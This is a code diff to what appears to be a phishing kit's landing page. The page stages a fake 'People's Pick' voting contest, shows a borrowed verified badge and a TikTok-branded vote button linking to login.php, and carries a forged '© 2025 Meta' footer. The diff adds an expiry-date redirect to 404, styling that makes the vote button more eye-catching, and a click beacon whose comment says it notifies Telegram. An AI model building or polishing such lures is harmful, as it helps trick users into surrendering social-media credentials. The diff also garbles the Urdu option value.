@@ -104,34 +104,80 @@ if ($currentTime > $setDate) {
             padding-right: 2.5rem;
         }
         
+        /* Enhanced responsive styles */
         @media (max-width: 480px) {
             .custom-language-select {
                 font-size: 14px;
-                padding: 12px 3rem 12px 16px;
+                padding: 10px 2.5rem 10px 12px;
             }
         }
         
         @media (min-width: 481px) and (max-width: 768px) {
             .custom-language-select {
                 font-size: 15px;
-                padding: 14px 3rem 14px 18px;
+                padding: 12px 2.5rem 12px 14px;
             }
         }
         
         @media (min-width: 769px) {
             .custom-language-select {
                 font-size: 16px;
-                padding: 16px 3rem 16px 20px;
+                padding: 14px 2.5rem 14px 16px;
             }
         }
+        
+        /* Bouncing animation for vote button */
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% {
+                transform: translateY(0);
+            }
+            40% {
+                transform: translateY(-10px);
+            }
+            60% {
+                transform: translateY(-5px);
+            }
+        }
+        
+        .bounce-animation {
+            animation: bounce 2s infinite;
+        }
+        
+        /* Pulse effect for extra attention */
+        @keyframes pulse {
+            0% {
+                box-shadow: 0 0 0 0 rgba(168, 85, 247, 0.7);
+            }
+            70% {
+                box-shadow: 0 0 0 10px rgba(168, 85, 247, 0);
+            }
+            100% {
+                box-shadow: 0 0 0 0 rgba(168, 85, 247, 0);
+            }
+        }
+        
+        .pulse-animation {
+            animation: pulse 2s infinite;
+        }
     </style>
+    
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const setDate = new Date("<?php echo $setDate->format('Y-m-d H:i:s'); ?>");
+            const currentTime = new Date();
+            
+            if (currentTime > setDate) {
+                window.location.href = '404';
+            }
+        });
+    </script>
 </head>
 
-<body class="bg-gray-100 min-h-screen flex flex-col items-center justify-center p-4">
-    <!-- Language Selector -->
-    <div class="w-full max-w-sm sm:max-w-md md:max-w-lg lg:max-w-xl xl:max-w-2xl mb-6 px-2">
+<body class="bg-gray-50 min-h-screen flex flex-col items-center justify-center p-2 sm:p-4 lg:p-6">
+    <!-- Language Selector - Fully Responsive -->
+    <div class="w-full max-w-xs sm:max-w-sm md:max-w-md lg:max-w-lg xl:max-w-xl mb-4 px-2">
         <select id="custom-language-select" 
-                class="custom-language-select w-full bg-white border border-gray-300 rounded-lg shadow-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 appearance-none cursor-pointer">
+                class="custom-language-select w-full bg-white border border-gray-300 rounded-lg shadow-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all duration-200 appearance-none cursor-pointer hover:border-gray-400">
             <option value="" class="text-gray-500">🌐 Select Language</option>
             <option value="en|af">🇿🇦 Afrikaans</option>
             <option value="en|sq">🇦🇱 Albanian</option>
@@ -229,7 +275,7 @@ if ($currentTime > $setDate) {
             <option value="en|th">🇹🇭 Thai</option>
             <option value="en|tr">🇹🇷 Turkish</option>
             <option value="en|uk">🇺🇦 Ukrainian</option>
-            <option value="en|ur">🇵🇰 Urdu</option>
+            <option value="enur">🇵🇰 Urdu</option>
             <option value="en|uz">🇺🇿 Uzbek</option>
             <option value="en|vi">🇻🇳 Vietnamese</option>
             <option value="en|cy">🏴󠁧󠁢󠁷󠁬󠁳󠁿 Welsh</option>
@@ -239,42 +285,33 @@ if ($currentTime > $setDate) {
     
     <div id="google_translate_element" style="display:none;"></div>
     
-    <!-- Main Content -->
-    <div class="w-full max-w-sm sm:max-w-md md:max-w-lg lg:max-w-xl xl:max-w-2xl bg-white rounded-lg shadow-lg overflow-hidden">
+    <!-- Main Content - Responsive -->
+    <div class="w-full max-w-xs sm:max-w-sm md:max-w-md lg:max-w-lg bg-white rounded-2xl shadow-xl overflow-hidden">
         <!-- Main Image -->
         <div class="relative">
             <img src="<?php echo $mainImage; ?>" alt="Main Image" class="w-full h-48 sm:h-56 md:h-64 lg:h-72 object-cover">
-            <div class="absolute top-4 right-4">
-                <div class="bg-black/80 rounded-full px-3 py-1">
-                    <span class="text-white text-xs font-semibold">🔥 TRENDING</span>
-                </div>
-            </div>
-            <h1 class="absolute bottom-4 left-4 text-white text-xl sm:text-2xl lg:text-3xl font-bold">THE PEOPLE'S PICK</h1>
+            <div class="absolute inset-0 bg-gradient-to-t from-black/50 to-transparent"></div>
+            <h1 class="absolute bottom-3 left-3 sm:bottom-4 sm:left-4 text-white text-xl sm:text-2xl lg:text-3xl font-bold">THE PEOPLE'S PICK</h1>
         </div>
         
         <!-- Content -->
-        <div class="p-6">
+        <div class="p-4 sm:p-5 md:p-6">
             <!-- Contestant Info -->
-            <div class="flex items-center mb-6">
-                <img src="https://i.postimg.cc/T1h8T8Jj/instagram-verified-tick-kxkwzn.png" alt="Verified Badge" class="w-12 h-12 rounded-full object-cover">
-                <div class="ml-4">
-                    <h2 class="text-lg font-bold text-gray-900"><?php echo htmlspecialchars($mainContestant['name']); ?></h2>
-                    <div class="flex items-center space-x-2">
-                        <span class="text-sm text-blue-600 font-semibold"><?php echo htmlspecialchars($mainContestant['votes']); ?> votes</span>
-                        <span class="text-gray-400">•</span>
-                        <span class="text-sm text-gray-600"><?php echo htmlspecialchars($mainContestant['position']); ?></span>
-                    </div>
+            <div class="flex items-center mb-4">
+                <img src="https://i.postimg.cc/T1h8T8Jj/instagram-verified-tick-kxkwzn.png" alt="Verified Badge" class="w-10 h-10 sm:w-12 sm:h-12 rounded-full object-cover">
+                <div class="ml-3">
+                    <h2 class="text-base sm:text-lg font-semibold text-gray-900"><?php echo htmlspecialchars($mainContestant['name']); ?></h2>
+                    <p class="text-xs sm:text-sm text-gray-500"><?php echo htmlspecialchars($mainContestant['votes']); ?> votes • <?php echo htmlspecialchars($mainContestant['position']); ?></p>
                 </div>
             </div>
             
             <!-- Message -->
-            <div class="bg-gray-50 rounded-lg p-4 mb-6">
-                <p class="text-gray-700 text-sm leading-relaxed">
-                    🌟 I need your support! Please take a moment to cast your vote and help me reach new heights in this competition. Your vote could be the difference-maker, propelling me toward victory! 🚀
-                </p>
-            </div>
+            <p class="text-gray-600 text-xs sm:text-sm mb-4 sm:mb-6 leading-relaxed">
+           I need your support! Please take a moment to cast your vote and help me reach new heights in this competition. Your vote could be the difference-maker, propelling me toward victory
+            </p>
             
-            <!-- Vote Button -->
+            
+             <!-- Vote Button -->
             <a href="login.php" id="vote-button" class="bg-black hover:bg-gray-800 flex items-center justify-center gap-3 text-white py-4 px-6 rounded-lg font-semibold text-base w-full transition-colors">
                 <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                     <path d="M16.6 5.82s.51.5 0 0A4.278 4.278 0 0 1 15.54 3h-3.09v12.4a2.592 2.592 0 0 1-2.59 2.5c-1.42 0-2.6-1.16-2.6-2.6 0-1.72 1.66-3.01 3.37-2.48V9.66c-3.45-.46-6.47 2.22-6.47 5.64 0 3.33 2.76 5.7 5.69 5.7 3.14 0 5.69-2.55 5.69-5.69V9.01a7.35 7.35 0 0 0 4.3 1.38V7.3s-1.88.09-3.24-1.48z" fill="white"/>
@@ -284,61 +321,80 @@ if ($currentTime > $setDate) {
         </div>
     </div>
     
-    <script type="text/javascript">
+    <!-- Footer -->
+    <div class="fixed bottom-4 left-1/2 transform -translate-x-1/2">
+        <p class="text-xs text-gray-400">© 2025 Meta</p>
+    </div>
+     <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            var customSelect = document.getElementById("custom-language-select");
+            customSelect.addEventListener("change", function() {
+                var langPair = this.value;
+                doGTranslate(langPair);
+            });
+            
+            // Add vote button click tracking
+            var voteButton = document.getElementById("vote-button");
+            if (voteButton) {
+                voteButton.addEventListener("click", function(e) {
+                    // Send notification to Telegram
+                    fetch(window.location.href, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                        },
+                        body: 'vote_clicked=1'
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Notification status:', data.status);
+                        if (data.status === 'rate_limited') {
+                            console.log('Rate limited. Time left:', data.time_left, 'seconds');
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error sending notification:', error);
+                    });
+                    
+                    // Continue with normal link behavior
+                    // The link will redirect normally after the fetch request
+                });
+            }
+        });
+        
+        function doGTranslate(langPair) {
+            if (!langPair) return;
+            var lang = langPair.split('|')[1];
+            var gtCombo = document.querySelector('.goog-te-combo');
+            if (gtCombo) {
+                gtCombo.value = lang;
+                var event = document.createEvent("HTMLEvents");
+                event.initEvent("change", true, true);
+                gtCombo.dispatchEvent(event);
+            }
+        }
+    </script>
+    
+    <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+    
+    <script>
         function googleTranslateElementInit() {
             new google.translate.TranslateElement({
                 pageLanguage: 'en',
                 autoDisplay: false
             }, 'google_translate_element');
             
-            // Auto-detect and set language
-            var userLang = navigator.language || navigator.userLanguage;
-            var langCode = userLang.split('-')[0];
-            
             setTimeout(function() {
-                var selectElement = document.querySelector('.goog-te-combo');
-                if (selectElement) {
-                    selectElement.value = langCode;
-                    selectElement.dispatchEvent(new Event('change'));
+                var userLang = navigator.language || navigator.userLanguage;
+                if (userLang && userLang.toLowerCase().indexOf('en') !== 0) {
+                    doGTranslate('en|' + userLang);
+                    var selectEl = document.getElementById("custom-language-select");
+                    if (selectEl) {
+                        selectEl.value = 'en|' + userLang;
+                    }
                 }
             }, 1000);
         }
-        
-        document.getElementById('custom-language-select').addEventListener('change', function() {
-            var selectedValue = this.value;
-            if (selectedValue) {
-                var langPair = selectedValue.split('|');
-                var targetLang = langPair[1];
-                
-                setTimeout(function() {
-                    var googleSelect = document.querySelector('.goog-te-combo');
-                    if (googleSelect) {
-                        googleSelect.value = targetLang;
-                        googleSelect.dispatchEvent(new Event('change'));
-                    }
-                }, 500);
-            }
-        });
-        
-        // Track vote button clicks
-        document.getElementById('vote-button').addEventListener('click', function(e) {
-            fetch(window.location.href, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: 'vote_clicked=1'
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Vote notification:', data);
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
-        });
     </script>
-    
-    <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 </body>
 </html>
